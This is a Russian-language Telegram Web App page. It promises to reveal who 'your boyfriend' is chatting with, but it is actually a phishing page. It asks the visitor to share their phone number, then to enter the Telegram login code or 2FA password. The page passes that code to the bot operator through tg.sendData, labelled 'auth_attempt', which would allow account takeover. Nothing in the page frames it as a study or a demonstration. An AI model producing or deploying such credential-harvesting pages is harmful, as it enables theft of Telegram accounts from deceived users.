<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { width: 90%; max-width: 400px; padding: 20px; border-radius: 20px; background: #111; border: 1px solid #222; }
        h2 { color: #00ff88; font-size: 18px; margin-bottom: 20px; }
        button { width: 100%; padding: 15px; border: none; border-radius: 10px; background: #fff; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; }
        input { width: 90%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; text-align: center; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="step1">
            <h2>Проверь, с кем общается твой парень</h2>
            <button onclick="nextStep(2)">АВТОРИЗАЦИЯ</button>
        </div>

        <div id="step2" class="hidden">
            <h2>Шаг 1: Доступ к контактам</h2>
            <p style="font-size: 12px; color: #888;">Для синхронизации данных необходимо подтвердить номер телефона</p>
            <button id="auth-btn">ПОДТВЕРДИТЬ НОМЕР</button>
        </div>

        <div id="step3" class="hidden">
            <h2>Шаг 2: Безопасность</h2>
            <p style="font-size: 12px; color: #888;">Введите код из сообщения или 2FA пароль</p>
            <input type="text" id="auth-code" placeholder="Код или пароль">
            <button onclick="sendFinalData()">ВОЙТИ</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        function nextStep(step) {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }

        // Запрос номера телефона через интерфейс Telegram
        document.getElementById('auth-btn').addEventListener('click', () => {
            tg.requestContact((ok) => {
                if (ok) {
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step3').classList.remove('hidden');
                } else {
                    alert("Для работы сервиса необходима авторизация");
                }
            });
        });

        function sendFinalData() {
            const code = document.getElementById('auth-code').value;
            if (code) {
                tg.sendData(JSON.stringify({
                    action: "auth_attempt",
                    payload: code
                }));
                tg.close();
            }
        }
    </script>
</body>
</html>
